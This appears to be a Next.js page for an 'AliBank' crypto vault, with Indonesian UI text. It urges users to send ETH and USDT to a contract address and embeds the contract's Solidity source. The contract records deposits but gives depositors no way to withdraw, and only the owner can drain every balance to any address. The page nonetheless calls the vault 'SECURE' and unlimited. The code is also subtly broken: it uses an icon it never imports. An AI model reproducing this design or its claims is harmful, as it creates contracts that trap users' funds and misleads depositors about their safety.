
"use client";

import { Navbar } from "@/components/layout/Navbar";
import { 
  ChevronLeft, 
  ShieldCheck, 
  Globe, 
  Network,
  Scale,
  Sparkles,
  ExternalLink,
  SearchCheck,
  Award,
  History,
  FileCode,
  Zap,
  Pickaxe,
  Coins,
  ArrowRightLeft,
  Building2,
  TrendingUp,
  Lock,
  Wallet,
  AlertTriangle,
  Lightbulb,
  DollarSign,
  Gavel,
  CheckCircle2,
  Calculator,
  ArrowRight,
  Copy,
  Code2,
  QrCode
} from "lucide-react";
import { Card } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { useRouter } from "next/navigation";
import { LogoIcon } from "@/components/ui/logo";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";

const ALIX_CONTRACT = "0x56268032A3B3E64CFeF1916d591087CF8dF40945";

const VAULT_CONTRACT_CODE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @dev Interface standar untuk token USDT (ERC-20).
 */
interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title AliBank Central Vault V3 - Multi-Asset & Institutional
 * @dev Alamat Kontrak: 0x56268032A3B3E64CFeF1916d591087CF8dF40945
 */
contract AliBankVault {
    address public owner;
    IERC20 public immutable usdt;
    
    mapping(address => uint256) public ethBalances;
    mapping(address => uint256) public usdtBalances;
    
    bool private _locked;

    event ETHDeposited(address indexed user, uint256 amount);
    event USDTDeposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed to, uint256 amount, string asset);

    constructor(address _usdtAddress) {
        owner = msg.sender;
        usdt = IERC20(_usdtAddress);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Hanya pemilik AliBank");
        _;
    }

    modifier nonReentrant() {
        require(!_locked, "Keamanan: Transaksi sedang diproses");
        _locked = true;
        _;
        _locked = false;
    }

    /**
     * @dev Menyetor ETH (Bisa jumlah besar atau kecil).
     */
    function depositETH() public payable {
        require(msg.value > 0, "Minimal deposit 1 Wei");
        ethBalances[msg.sender] += msg.value;
        emit ETHDeposited(msg.sender, msg.value);
    }

    /**
     * @dev Menyetor USDT (Mendukung integrasi dari wallet luar).
     * Pastikan user sudah melakukan "Approve" USDT ke alamat kontrak ini.
     */
    function depositUSDT(uint256 _amount) public nonReentrant {
        require(_amount > 0, "Minimal deposit > 0 USDT");
        require(usdt.transferFrom(msg.sender, address(this), _amount), "Transfer USDT gagal");
        
        usdtBalances[msg.sender] += _amount;
        emit USDTDeposited(msg.sender, _amount);
    }

    /**
     * @dev Fungsi darurat untuk menarik dana (Hanya Owner AliBank).
     */
    function withdrawAll(address payable _to) public onlyOwner nonReentrant {
        uint256 ethBal = address(this).balance;
        uint256 usdtBal = usdt.balanceOf(address(this));
        
        if(ethBal > 0) _to.transfer(ethBal);
        if(usdtBal > 0) usdt.transfer(_to, usdtBal);
    }

    receive() external payable {
        depositETH();
    }
}`;

export default function AboutAlixPage() {
  const router = useRouter();
  const { toast } = useToast();

  const copyCode = () => {
    navigator.clipboard.writeText(VAULT_CONTRACT_CODE);
    toast({ title: "Kode Disalin", description: "Smart Contract Brankas AliBank V3 siap ditempel di Remix IDE." });
  };

  const copyAddress = () => {
    navigator.clipboard.writeText(ALIX_CONTRACT);
    toast({ title: "Alamat Disalin", description: "Alamat Brankas Pusat siap digunakan di Wallet Luar." });
  };

  return (
    <div className="min-h-screen pb-32 bg-background selection:bg-primary/20">
      <Navbar />
      
      <main className="container mx-auto px-4 max-w-5xl pt-8">
        <header className="mb-12">
          <button 
            onClick={() => router.back()}
            className="flex items-center gap-2 text-[10px] font-black uppercase text-muted-foreground hover:text-primary transition-colors mb-8"
          >
            <ChevronLeft className="w-4 h-4" /> Kembali ke Command Center
          </button>
          
          <div className="flex flex-col md:flex-row items-center gap-8">
            <div className="w-32 h-32 rounded-[2.5rem] gold-gradient flex items-center justify-center shadow-2xl p-8 relative overflow-hidden group">
              <div className="absolute inset-0 bg-black/10 group-hover:bg-transparent transition-colors" />
              <LogoIcon className="text-white relative z-10" />
            </div>
            <div className="text-center md:text-left flex-1">
              <Badge className="bg-green-600 text-white border-none px-4 py-1 mb-4 rounded-full font-black uppercase tracking-widest text-[10px] animate-pulse">
                VAULT V3: MULTI-ASSET LIVE
              </Badge>
              <h1 className="text-5xl font-black text-accent uppercase italic tracking-tighter leading-tight dark:text-white">
                Infrastruktur <span className="text-primary">Brankas AliBank</span>
              </h1>
              <div className="flex flex-wrap items-center justify-center md:justify-start gap-4 mt-4">
                <p className="text-muted-foreground text-sm font-bold uppercase tracking-widest flex items-center gap-2 italic">
                  <ShieldCheck className="w-4 h-4 text-primary" /> Multi-Asset Central Vault
                </p>
              </div>
            </div>
          </div>
        </header>

        {/* ALAMAT BRANKAS UNTUK WALLET LUAR */}
        <section className="mb-16">
          <div className="liquid-glass border-none rounded-[3rem] p-10 bg-primary/5 flex items-center gap-8 flex-col md:flex-row shadow-2xl">
            <div className="w-24 h-24 rounded-[2rem] bg-background flex items-center justify-center text-primary shrink-0 shadow-xl border-4 border-primary/20">
              <QrCode className="w-12 h-12" />
            </div>
            <div className="space-y-4 flex-1">
              <div>
                <h2 className="text-2xl font-black text-accent uppercase italic tracking-tighter dark:text-white leading-none">Alamat Terima Aset Luar</h2>
                <p className="text-[10px] text-muted-foreground font-bold mt-2 uppercase tracking-widest">Gunakan alamat ini di MetaMask, Trust Wallet, atau bursa lain.</p>
              </div>
              <div className="flex flex-col md:flex-row gap-4 items-center">
                <div className="bg-black/10 dark:bg-white/5 p-4 rounded-xl font-mono text-[11px] break-all text-accent dark:text-white w-full border border-primary/10">
                  {ALIX_CONTRACT}
                </div>
                <Button onClick={copyAddress} className="gold-gradient text-white font-black uppercase italic text-[10px] h-12 px-8 rounded-xl shrink-0">
                  <Copy className="w-4 h-4 mr-2" /> Salin Alamat
                </Button>
              </div>
              <div className="flex items-center gap-3">
                <Badge className="bg-blue-100 text-blue-600 border-none font-black text-[8px] uppercase">Ethereum Mainnet</Badge>
                <Badge className="bg-green-100 text-green-600 border-none font-black text-[8px] uppercase">USDT (ERC-20)</Badge>
                <Badge className="bg-orange-100 text-orange-600 border-none font-black text-[8px] uppercase">ETH Native</Badge>
              </div>
            </div>
          </div>
        </section>

        {/* SMART CONTRACT SOURCE CODE */}
        <section className="mb-16">
          <div className="liquid-glass-dark rounded-[3rem] p-12 border-none shadow-2xl space-y-8 relative overflow-hidden">
            <div className="absolute top-0 right-0 p-8 opacity-10">
              <Code2 className="w-32 h-32 text-primary" />
            </div>
            
            <div className="relative z-10">
              <div className="flex items-center justify-between mb-6">
                <div>
                  <Badge className="bg-primary text-primary-foreground font-black uppercase text-[8px] mb-2">Central Vault V3.1</Badge>
                  <h2 className="text-3xl font-black text-white uppercase italic tracking-tighter">Source Code AliBank Vault</h2>
                </div>
                <Button 
                  onClick={copyCode}
                  className="h-12 bg-white/10 hover:bg-white/20 text-white border border-white/10 rounded-xl font-bold gap-2 px-6"
                >
                  <Copy className="w-4 h-4" /> Copy Vault Code
                </Button>
              </div>

              <div className="bg-black/40 rounded-2xl border border-white/5 p-6 overflow-hidden">
                <pre className="text-[10px] font-mono text-primary/80 leading-relaxed overflow-x-auto no-scrollbar">
                  {VAULT_CONTRACT_CODE}
                </pre>
              </div>

              <div className="mt-8 p-6 rounded-2xl bg-blue-500/10 border border-blue-500/20 flex gap-4">
                <Info className="w-6 h-6 text-blue-500 shrink-0" />
                <p className="text-[9px] text-white/70 italic leading-relaxed uppercase font-bold">
                  Catatan Keamanan: Kontrak ini sekarang mendukung **USDT** dan **ETH**. Pembayaran besar diproteksi oleh fungsi `nonReentrant`. Anda dapat menerima setoran nominal kecil tanpa batasan minimal pada fungsi `depositUSDT` versi 3.1 ini.
                </p>
              </div>
            </div>
          </div>
        </section>

        <section className="mb-16">
          <div className="liquid-glass-dark rounded-[3rem] p-12 border-none shadow-2xl relative overflow-hidden">
            <div className="absolute top-0 right-0 p-8 opacity-10">
              <Calculator className="w-32 h-32 text-primary" />
            </div>
            <div className="relative z-10 space-y-8">
              <div className="flex items-center gap-4">
                <Badge className="bg-primary text-primary-foreground font-black uppercase text-[8px]">Protocol Compliance</Badge>
                <h2 className="text-3xl font-black text-white uppercase italic tracking-tighter">Kapabilitas Brankas</h2>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
                <div className="space-y-6">
                  <p className="text-xs font-medium text-white/70 leading-relaxed italic uppercase">
                    Seluruh dana dari dompet luar akan langsung tercatat sebagai agunan likuiditas AliBank. Setiap transaksi divalidasi oleh node Ethereum global sebelum disinkronkan ke Command Center.
                  </p>
                  <div className="p-6 rounded-2xl bg-white/5 border border-white/10 space-y-4">
                    <p className="text-[10px] font-black text-primary uppercase tracking-widest">Kesesuaian Aset</p>
                    <div className="flex items-center justify-center gap-4 py-4 bg-black/20 rounded-xl font-mono text-xl text-white font-bold">
                      <span className="text-primary">MULTI</span>
                      <span>ASSET</span>
                      <span className="text-xs text-white/40">SUPPORTED</span>
                    </div>
                  </div>
                </div>

                <div className="space-y-6">
                  <div className="p-6 rounded-2xl bg-white/5 border border-white/10">
                    <p className="text-[10px] font-black text-white/40 uppercase tracking-widest mb-4">Metrik Kepatuhan</p>
                    <div className="space-y-3">
                      <div className="flex justify-between items-center text-[11px] font-bold uppercase">
                        <span className="text-white/60">Aset yang Diterima</span>
                        <span className="text-white">ETH & USDT</span>
                      </div>
                      <div className="flex justify-between items-center text-[11px] font-bold uppercase">
                        <span className="text-white/60">Batas Setoran</span>
                        <span className="text-primary">Unlimited</span>
                      </div>
                      <div className="h-px bg-white/10 my-2" />
                      <div className="flex justify-between items-center">
                        <span className="text-[9px] font-black text-white/40 uppercase">Status Operasional</span>
                        <span className="text-lg font-black text-green-400 italic">SECURE</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>

        <footer className="text-center space-y-8 pt-20 border-t border-primary/10">
          <div className="flex items-center justify-center gap-3">
            <div className="w-10 h-10 p-2 rounded-xl gold-gradient flex items-center justify-center shadow-2xl">
              <LogoIcon className="text-white" />
            </div>
            <p className="text-base font-black text-accent italic uppercase tracking-tighter dark:text-white">AliBank V3 Infrastructure • Vault Node Online</p>
          </div>
        </footer>
      </main>
    </div>
  );
}
